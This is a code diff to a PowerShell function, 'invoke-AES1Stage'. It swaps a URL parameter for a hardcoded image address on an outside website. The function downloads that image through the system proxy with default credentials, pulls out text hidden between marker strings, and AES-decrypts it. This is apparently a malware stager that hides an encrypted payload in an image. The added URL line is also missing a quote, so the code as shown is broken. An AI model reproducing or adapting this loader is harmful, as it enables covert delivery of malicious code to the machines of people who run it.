@@ -1,15 +1,11 @@
 function invoke-AES1Stage
 {
-Param (
-            [string]$ImageUrl
-      )  
-      if ($imageurl -ne $null)
-      {
+
         $request = New-Object System.Net.WebCLient
         $proxy = New-Object System.Net.webproxy
         $request.proxy = $proxy
         $request.usedefaultcredentials = "true"
-        $inputentirestring = $request.Downloadstring($ImageUrl)
+        $inputentirestring = $request.Downloadstring(http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png')
         [array] $xvalue = ([regex]'wootwoot').split($inputentirestring)
         [array] $yvalue = ([regex]'weetweet').split($xvalue[1])
         $InputString = $yvalue[0]
@@ -33,5 +29,5 @@ Param (
         [byte[]]$DEncrypted = $MemoryStream.ToArray()
         $DEncrypteds = [Text.Encoding]::utf8.GetString($DEncrypted)
         return $DEncrypteds
-      }
+      
 }
